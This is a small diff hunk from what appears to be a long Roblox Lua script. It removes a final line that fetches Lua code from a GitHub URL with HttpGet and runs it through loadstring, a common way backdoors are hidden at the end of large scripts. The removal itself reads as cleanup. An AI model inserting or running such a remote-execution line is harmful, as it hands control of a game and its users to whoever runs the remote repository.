@@ -14010,4 +14010,3 @@ sound.Ended:Connect(function()
     sound:Destroy()
     end)
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripting-404/Administrator/refs/heads/main/Executions.lua"))()
